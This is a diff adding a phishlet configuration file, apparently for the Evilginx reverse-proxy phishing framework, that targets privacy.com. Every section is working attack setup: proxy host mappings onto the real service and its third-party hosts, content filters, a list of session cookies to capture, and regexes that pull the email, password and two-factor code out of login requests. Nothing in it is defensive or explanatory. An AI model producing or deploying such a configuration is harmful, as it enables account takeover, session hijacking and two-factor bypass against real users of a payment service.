@@ -1,0 +1,63 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'privacy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'privacy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'privacy.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'o1053332.ingest.us', orig_sub: 'o1053332.ingest.us', domain: 'sentry.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'zdassets.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'privacy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'privacy', orig_sub: 'privacy', domain: 'zendesk.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'privacy', orig_sub: 'privacy', domain: 'piwik.pro', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'privacy.container', orig_sub: 'privacy.container', domain: 'piwik.pro', session: true, is_landing: false, auto_filter: true}
+
+
+sub_filters:
+  - {triggers_on: 'app.privacy.com', orig_sub: 'app', domain: 'privacy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'privacy.zdassets.com', orig_sub: 'privacy', domain: 'zdassets.com', search: '{domain}', replace: '{hostname}:443', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'app.privacy.com', orig_sub: 'app', domain: 'privacy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'cdn.privacy.com', orig_sub: 'cdn', domain: 'privacy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'static.privacy.com', orig_sub: 'static', domain: 'zdassets.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'o1053332.ingest.us.sentry.io', orig_sub: 'o1053332.ingest.us', domain: 'sentry.io', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+
+
+auth_tokens:
+  - domain: '.privacy.com'
+    keys: ['sessionID','__zlcmid','_pk_id.b1731a03-2076-42ac-b00e-c72002f85000.58f4','_pk_ses.b1731a03-2076-42ac-b00e-c72002f85000.58f4','ppms_privacy_b1731a03-2076-42ac-b00e-c72002f85000']
+    type: 'cookie'
+  - domain: 'app.privacy.com'
+    keys: ['sessionID','__zlcmid','_pk_id.b1731a03-2076-42ac-b00e-c72002f85000.58f4','_pk_ses.b1731a03-2076-42ac-b00e-c72002f85000.58f4','ppms_privacy_b1731a03-2076-42ac-b00e-c72002f85000']
+    type: 'cookie'
+
+
+auth_urls:
+  - '/home'
+  - '/login'
+  - '/'
+
+
+
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)' 
+    type: 'json'
+  custom:
+    key: 'tfa'
+    search: '"code":"([^"]*)'
+    type: 'json'
+  #custom:
+    #key: ''
+    #search: '"userToken":"([^"]*)'
+    #type: 'json'
+
+login:
+  domain: 'app.privacy.com'
+  path: '/login'
+
